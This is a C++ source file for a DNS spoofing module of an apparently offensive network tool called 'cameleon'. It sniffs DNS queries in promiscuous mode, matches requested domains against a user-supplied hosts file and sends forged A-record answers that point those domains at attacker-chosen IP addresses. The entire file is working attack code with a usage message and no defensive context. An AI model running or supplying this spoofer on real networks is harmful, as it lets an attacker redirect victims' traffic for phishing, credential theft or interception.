#include "DnsSpoof.hh"

#include <QFile>
#include <QTextStream>

#include "Debug.hh"

DnsSpoof *DnsSpoof::create(const StartModuleArgs & startModuleArgs)
{
    if (startModuleArgs.options.size() < 1)
    {
        return nullptr;
    }

    DnsSpoof::Config    config;

    config.hostsFile = startModuleArgs.options[0];

    return new DnsSpoof(startModuleArgs, config);
}

Tins::SnifferConfiguration DnsSpoof::snifferConfiguration()
{
    Tins::SnifferConfiguration  config;

    config.set_filter("dst port 53");
    config.set_promisc_mode(true);

    return config;
}

const QStringList DnsSpoof::USAGE = { "DnsSpoof module usage :",
                                      "\t cameleon start DnsSpoof <module name> <host file>",
                                      "\t Each host file line must have the form : 'ip_address domain'"
                                    };

/* Class DnsSpoof *************************************************************/

DnsSpoof::DnsSpoof(const StartModuleArgs & startModuleArgs, const Config & config)
    : AModule("DnsSpoof", startModuleArgs.name, startModuleArgs.iface),
      m_packetSender(m_iface.toStdString()),
      m_sniffer(m_iface.toStdString(), DnsSpoof::snifferConfiguration())
{
    QFile           hostsFile(config.hostsFile);
    QTextStream     content(&hostsFile);
    QString         ip, domain;

    hostsFile.open(QIODevice::ReadOnly);

    while ( ! content.atEnd())
    {
        content >> ip >> domain;
        if (domain.size() != 0 && ip.size() != 0)
            m_spoofedDomains[domain] = ip;
    }
}

void DnsSpoof::start()
{
    DEBUG("DnsSpoof::start() : Name:" << m_name, true);
    m_sniffer.sniff_loop(Tins::make_sniffer_handler(this, &DnsSpoof::handler));
}

void DnsSpoof::stop()
{
    m_sniffer.stop_sniff();
}

bool DnsSpoof::handler(Tins::PDU & pdu)
{
    // EthernetII / IP / UDP / RawPDU
    Tins::EthernetII eth = pdu.rfind_pdu<Tins::EthernetII>();
    Tins::IP ip = eth.rfind_pdu<Tins::IP>();
    Tins::UDP udp = ip.rfind_pdu<Tins::UDP>();
    Tins::DNS dns = udp.rfind_pdu<Tins::RawPDU>().to<Tins::DNS>();

    // Is it a DNS query?
    if(dns.type() == Tins::DNS::QUERY)
    {
        std::map<std::string, std::string>::iterator  it;

        // Let's see if there's any query for an "A" record.
        for(const Tins::DNS::query &query : dns.queries())
        {
            if(query.query_type() == Tins::DNS::A)
            {
                QString dname = QString::fromStdString(query.dname());

                DEBUG("Query " << dname, true);
                if (m_spoofedDomains.contains(dname))
                {
                    DEBUG("Spoof " << dname, true);
                    dns.add_answer(Tins::DNS::resource(query.dname(), m_spoofedDomains[dname].toStdString(), Tins::DNS::A, query.query_class(), 111));
                }
            }
        }

        // Have we added some answers?
        if(dns.answers_count() > 0)
        {
            // It's a response now
            dns.type(Tins::DNS::RESPONSE);
            // Recursion is available(just in case)
            dns.recursion_available(1);
            // Build our packet
            Tins::EthernetII pkt =  Tins::EthernetII(eth.src_addr(), eth.dst_addr()) /
                                    Tins::IP(ip.src_addr(), ip.dst_addr()) /
                                    Tins::UDP(udp.sport(), udp.dport()) /
                                    dns;
            // Send it!
            m_packetSender.send(pkt);
        }
    }
    return true;}

